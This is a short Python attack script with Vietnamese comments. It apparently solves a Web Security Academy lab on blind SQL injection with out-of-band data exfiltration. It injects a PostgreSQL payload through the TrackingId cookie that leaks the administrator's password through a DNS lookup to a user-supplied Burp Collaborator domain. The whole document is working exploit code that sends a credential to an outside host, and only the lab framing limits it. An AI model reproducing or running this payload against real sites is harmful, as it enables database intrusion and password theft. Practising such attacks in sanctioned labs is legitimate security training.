import requests

def exfiltrate_data(url, collab_domain, session_cookie):
    print("[*] Đang gửi payload để exfiltrate password...")

    # Payload SQLi exfil dữ liệu qua DNS (PostgreSQL)
    payload = f"xyz'||(SELECT+make_dns_request((SELECT+password+||+'.{collab_domain}'+FROM+users+WHERE+username='administrator')))--"
    
    cookies = {
        "TrackingId": payload,
        "session": session_cookie
    }

    try:
        response = requests.get(url, cookies=cookies, timeout=10)
        if response.status_code == 200:
            print("[+] Payload gửi thành công!")
            print("    → Truy cập Burp Collaborator để xem tên miền bị truy vấn.")
        else:
            print(f"[-] Server trả về mã lỗi HTTP: {response.status_code}")
    except Exception as e:
        print(f"[!] Lỗi khi gửi request: {e}")

if __name__ == "__main__":
    print("=== Blind SQLi w/ Out-of-Band Data Exfiltration ===")
    url = input("Nhập URL lab (ví dụ: https://xxxxx.web-security-academy.net): ").rstrip("/")
    collab_domain = input("Nhập domain từ Burp Collaborator (vd: xyz123.oastify.com): ").strip()
    session_cookie = input("Nhập session cookie: ").strip()

    exfiltrate_data(url, collab_domain, session_cookie)
